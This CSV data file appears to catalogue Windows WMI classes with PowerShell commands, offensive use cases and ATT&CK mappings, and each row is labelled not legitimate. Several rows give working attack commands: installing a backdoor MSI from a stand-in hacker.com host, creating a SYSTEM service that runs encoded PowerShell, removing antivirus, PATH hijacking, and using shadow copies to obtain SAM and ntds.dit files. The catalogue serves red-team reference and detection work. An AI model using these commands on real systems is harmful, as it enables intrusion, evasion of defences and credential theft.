"Name","Description","Updated","Toolsets","Commands","Commands_Command","Commands_Description","Commands_Usecases","Commands_Function","Commands_Comments","Commands_MitreAttack","Resources","Detections","Contributors","Contributors_Name","Contributors_Handle","Detections_Port","is_legit"
"Win32_SystemDriver","Represents the system driver for a base service","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","None","None","None","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_ShadowCopy","Storage extent that represents a duplicate copy of the original volume at a previous time","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -ClassName Win32_ShadowCopy -CimSession $s -Filter ""ID=`""$($r.ShadowID)`""""","[''Create new shadow copy''-|-''Show details of a volume shadow copy'']","[''None''-|-''Get shadow copy details for use with [Copy-Item](../../Cmdlets/Copy-Item) to obtain `SAM`/`SYSTEM`/`SECURITY`/`ntds.dit` files'']","[''Data''-|-''Data'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_Service","Represents a service on a computer system running Windows","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''$tssvc = Get-CimInstance -Filter 'Name=""TermService""' -ClassName Win32_Service -CimSession $s $tssvc $tssvc | Invoke-CimMethod -MethodName StartService ''-|-''Get-CimInstance -ClassName Win32_Service -CimSession $s''-|-''Get-CimInstance -Filter 'Name=""TermService""' -ClassName Win32_Service -CimSession $s''-|-''Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,""Print Spooler (x64)"",([byte]1),$null,$null,""spoolsv64"",""C:\Windows\System32\cmd.exe /c powershell -e bHM="",$null,([byte]16),""Manual"",""NT AUTHORITY\SYSTEM"",""""'']","[''Start service''-|-''List services''-|-''Obtain a specific service instance''-|-''Create new service'']","[''None''-|-''Reconnaissance on installed services''-|-''Start or stop a service''-|-''None'']","[''Execute''-|-''Processes''-|-''Processes''-|-''Execute'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'']","[''T1569.002''-|-''None''-|-''None''-|-''TA0002'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_QuickFixEngineering","Represents a small system-wide update, commonly referred to as a quick-fix engineering (QFE) update, applied to the current operating system","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance Win32_QuickFixEngineering -CimSession $s","List of installed KBs","List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities","Recon","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See also [systeminfo.exe](../../Binaries/systeminfo)''-|-''Namespace: `ROOT\Cimv2`'']","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_Product","Represent products as they are installed by MSI","2023-08-25","[''Builtin''-|-''CIMSession'']","","[''Get-CimInstance -ClassName Win32_Product -CimSession $s | Select-Object Caption,Vendor,Version,InstallLocation''-|-''Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation=""https://hacker.com/backdoor.msi""; Options=""""; AllUsers=$true} -CimSession $s''-|-''Get-CimInstance Win32_Product -Filter 'Caption=""Antivirus Software caption""' -CimSession $s | Remove-CimInstance'']","[''List installed software''-|-''Install software''-|-''Uninstall software'']","[''Perform reconnaissance on installed security software''-|-''Launch and install malicious .msi package''-|-''Remove security software'']","[''Manage''-|-''Execute''-|-''Manage'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''.msi file needs to be available on the target host''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","[''T1218.007''-|-''T1218.007''-|-''T1218.007''-|-''T1562.001'']","https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform-part-3#execute-command-lines","None","","Arris Huijgen","bitsadmin","","false"
"Win32_Process","Represents a process on an operating system","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -ClassName Win32_Process -CimSession $s | select ProcessId,Name,CommandLine | ft * -AutoSize -Wrap","[''Launch executable''-|-''List running processes'']","[''Launch implant''-|-''Launch implant'']","[''Execute''-|-''Processes'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","[''TA0002''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_OperatingSystem","Represents a Windows-based operating system installed on a computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance Win32_OperatingSystem -CimSession $s | fl *","Information about OS","Reconnaissance of target operating system","Recon","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See also [systeminfo.exe](../../Binaries/systeminfo)''-|-''Namespace: `ROOT\Cimv2`''-|-''Alternative: `CIM_OperatingSystem`'']","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_NTLogEvent","Displays the Windows Event Log","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -ClassName Win32_NTLogEvent -Filter ""LogFile = 'Security' AND EventCode = '4624'"" -CimSession $s","List logons on a system","Understand which accounts are used on a system","Logs","Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_Environment","Represents an environment or system environment setting on a Windows computer system","2023-07-01","[''Builtin''-|-''CIMSession'']","","New-CimInstance -ClassName Win32_Environment -Property @{Name=""PATH"";VariableValue=""C:\hackertools; C:\Windows\System32;C:\Windows"";UserName=""<SYSTEM>""} -CimSession $s","Set environment variable","Change PATH environment variable for search order hijacking","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''For the VariableValue, first obtain the current `PATH` using `Get-CimInstance` and then prefix it with the malicious path''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_DfsNode","Represents a root or a link of a domain based or a standalone distributed file system (DFS)","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","None","None","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
